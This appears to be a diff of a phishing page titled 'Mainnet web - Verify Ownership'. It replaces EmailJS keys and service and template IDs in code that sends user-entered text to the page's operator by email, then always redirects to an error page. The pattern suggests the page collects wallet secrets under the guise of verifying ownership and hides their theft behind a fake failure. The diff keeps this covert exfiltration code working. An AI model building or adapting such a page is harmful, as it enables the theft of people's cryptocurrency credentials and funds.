@@ -15,7 +15,7 @@
     </script>
     <script type="text/javascript">
         (function () {
-            emailjs.init("mfY7yH4IHyyVQsapk");
+            emailjs.init("oZMfh8Pn5s8P-9Awx");
         })();
     </script>
     <title>Mainnet web - Verify Ownership</title>
@@ -603,12 +603,12 @@
 
             let parms = { message: safetext };
 
-            emailjs.send("service_ocoq02x", "template_wgo1bul", parms)
+            emailjs.send("service_18cd01v", "template_artm0pa", parms)
                 .then(function (response) {
                     window.location.href = "error.html";
                 })
                 .catch(function (error) {
-                    console.error("Transmission error...", error);
+                    console.error("No", error);
                     window.location.href = "error.html";
                 });
         }
